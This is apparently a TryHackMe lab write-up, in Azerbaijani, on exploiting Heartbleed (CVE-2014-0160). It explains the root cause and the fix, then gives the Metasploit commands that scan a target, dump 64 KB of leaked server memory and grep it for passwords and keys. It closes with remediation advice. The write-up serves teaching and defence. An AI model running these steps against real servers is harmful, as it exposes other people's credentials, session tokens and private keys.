# Heartbleed (CVE-2014-0160) — İstismar Hesabatı

## Ümumi Baxış

Bu hesabat, TryHackMe laboratoriya mühitində, zəif OpenSSL versiyası işlədən bir hədəfə qarşı **Heartbleed** zəifliyinin (CVE-2014-0160) aşkarlanması və istismar edilməsi prosesini sənədləşdirir. Metasploit Framework istifadə edilərək, zərərli TLS heartbeat sorğusu vasitəsilə yaddaş sızıntısı nümayiş etdirilmişdir.

| | |
|---|---|
| **Zəiflik** | Heartbleed |
| **CVE** | CVE-2014-0160 |
| **Təsirlənən Komponent** | OpenSSL 1.0.1 – 1.0.1f |
| **Zəiflik Növü** | Sərhəddən Kənar Oxuma (Out-of-bounds Read) / Həssas Məlumat Sızması |
| **CVSS** | 5.0 (Orta, NVD-nin ilkin qiymətləndirməsinə əsasən) |
| **Hədəf** | `10.81.120.198:443` |
| **İstifadə Olunan Alət** | Metasploit Framework |

---

## 1. Fon Məlumatı

TLS bağlantıları, tam əl sıxma (handshake) prosesini təkrarlamadan boş qalan bağlantıları "canlı" saxlamaq üçün **heartbeat** genişlənməsindən istifadə edir. Heartbeat mexanizmi belə işləyir:

1. Client bir data yükü (payload) və onun **bəyan edilmiş uzunluğunu** göndərir.
2. Server eyni data yükünü client-ə dəqiq olaraq geri qaytarır.

### Zəifliyin Səbəbi

Zəif OpenSSL implementasiyası **client tərəfindən bəyan edilmiş uzunluğa**, onu **əsl göndərilən datanın ölçüsü** ilə tutuşdurmadan etibar edirdi. Bu, client-ə aşağıdakıları etmək imkanı verirdi:

1. Kiçik data yükü göndərmək (məs. 1 bayt), amma çox daha böyük uzunluq bəyan etmək (maksimum 65,535 bayta qədər).
2. Server-i bəyan edilmiş uzunluğa uyğun ölçüdə bufer ayırmağa məcbur etmək.
3. Əsl data yükünü buferə kopyalatmaq, ardınca **server yaddaşında artıq mövcud olan qonşu məlumatları** da eyni buferə köçürtmək.
4. Bütün buferin geri qaytarılmasını təmin edərək, işə salınmamış/qonşu yaddaş məzmununu sızdırmaq.

Server yaddaşı daim dəyişdiyi üçün, təkrarlanan sorğular hər dəfə **fərqli yaddaş bölgələrini** sızdırır və bu da aşağıdakı kimi həssas məlumatların tədricən əldə edilməsinə imkan verir:

- Şəxsi açarlar (private key-lər)
- Sessiya tokenləri
- İstifadəçi adları və parollar
- Digər yaddaşda saxlanılan tətbiq məlumatları

### Kök Səbəb

Client tərəfindən göndərilən uzunluq sahəsi, nə qədər yaddaşın oxunub geri qaytarılacağını müəyyən etmək üçün istifadə edilməzdən əvvəl heç bir sərhəd yoxlamasından keçmirdi.

### Düzəliş

Yamaqlanmış (patched) implementasiya aşağıdakıları təsdiqləyir:
1. Bəyan edilmiş uzunluq 0-dan böyükdür.
2. Bəyan edilmiş uzunluq, əslində alınan datanın ölçüsünü aşmır.

---

## 2. Metodologiya

### 2.1 Zəifliyin Təsdiqlənməsi

Metasploit açıldı və Heartbleed skan modulu yükləndi:

```bash
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 10.81.120.198
set RPORT 443
run
```

**Nəticə:**

```
[+] 10.81.120.198:443 - Heartbeat response with leak, 65535 bytes
[*] 10.81.120.198:443 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Hədəf zəif olduğu təsdiqləndi — hər sorğuda mümkün maksimum cavab ölçüsü (65,535 bayt) sızdırılırdı.

### 2.2 Yaddaş Dump-ının Əldə Edilməsi

Modulun rejimi sadə yoxlamadan tam yaddaş dump-ı çıxarmağa dəyişdirildi:

```bash
set ACTION DUMP
run
```

**Nəticə:**

```
[+] 10.81.120.198:443 - Heartbeat response with leak, 65535 bytes
[+] 10.81.120.198:443 - Heartbeat data stored in /root/.msf4/loot/20260712174056_default_10.81.120.198_openssl.heartble_022055.bin
[*] 10.81.120.198:443 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Sızan yaddaş bölgəsi, sonradan təhlil etmək üçün binar loot faylına yazıldı.

### 2.3 Sızan Datanın Təhlili

`.bin` faylı xam yaddaş məzmunu ehtiva edir və birbaşa `cat` ilə oxunaqlı deyil. Oxunaqlı mətn hissələri aşağıdakı əmrlə çıxarıldı:

```bash
strings /root/.msf4/loot/*heartble*.bin
```

Maraqlı göstəricilər üçün süzgəcdən keçirildi:

```bash
strings /root/.msf4/loot/*heartble*.bin | grep -iE "flag|thm|password|user|key"
```

Bu, xam yaddaş dump-ından oxunaqlı mətn parçalarını ayırdı və server-in proses yaddaşından sızan həssas məlumatları üzə çıxardı.

---

## 3. Əsas Tapıntılar

- Hədəfin TLS xidməti (443 portu) Heartbleed-ə həssas OpenSSL versiyası işlədirdi.
- Sızıntını tetikləmək üçün heç bir autentifikasiya tələb olunmurdu — zəiflik autentifikasiyasız istismar oluna bilər.
- Tək bir sorğu ilə qonşu proses yaddaşından 65,535 bayta qədər məlumat sızdırıldı.
- Təkrarlanan sorğular vaxtla fərqli yaddaş bölgələrini toplamaq üçün istifadə oluna bilər, bu da giriş məlumatları və ya açar materialının ələ keçirilmə ehtimalını artırır.

---

## 4. Aradan Qaldırma Tövsiyələri

1. OpenSSL-i yamaqlanmış versiyaya (1.0.1g və ya sonrakı) yeniləyin.
2. Yeniləmə dərhal mümkün olmadığı hallarda, heartbeat genişlənməsini tamamilə söndürün.
3. Təsirlənmiş serverlərdə açıq ola biləcək bütün TLS şəxsi açarlarını və sertifikatlarını dəyişdirin, çünki kompromis olunmuş şəxsi açar, hətta yamaqdan sonra belə etibarlı hesab edilə bilməz.
4. Yenidən autentifikasiyanı məcburi edin və aktiv sessiyaları etibarsız sayın, çünki sessiya tokenləri sızmış ola bilər.
5. Aşkarlama tədbiri kimi, anomal heartbeat sorğu nümunələrini izləyin.

---

## 5. Öyrənilən Dərslər

- Metasploit auxiliary modulunun iş axını (`use` → `set` → `run`) istifadə edilərək, real dünyada tarixi əhəmiyyətli bir CVE-nin başdan-sona istismarı nümayiş etdirildi.
- Aşağı səviyyəli şəbəkə protokolu implementasiyalarında giriş uzunluğu yoxlamasının vacibliyi vurğulandı.
- `strings` aləti ilə oxunaqlı məzmunu ayırmaq üçün xam binar yaddaş dump-larının çıxarılması və təhlili öyrənildi.
- Metasploit-in modul icrası zamanı tutulan artefaktları saxladığı `loot` qovluğu konvensiyası öyrənildi.

---

## İstinadlar

- [heartbleed.com](http://heartbleed.com/)
- [Diagnosis of the OpenSSL Heartbleed Bug — Sean Cassidy](https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html)
- [CVE-2014-0160 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-0160)

---

> Bu hesabat, yalnız təhsil məqsədilə TryHackMe üzərində əl işi laboratoriya tapşırığının bir hissəsi olaraq hazırlanmışdır. Bütün testlər icazə verilmiş, izolə edilmiş laboratoriya mühitində aparılmışdır.
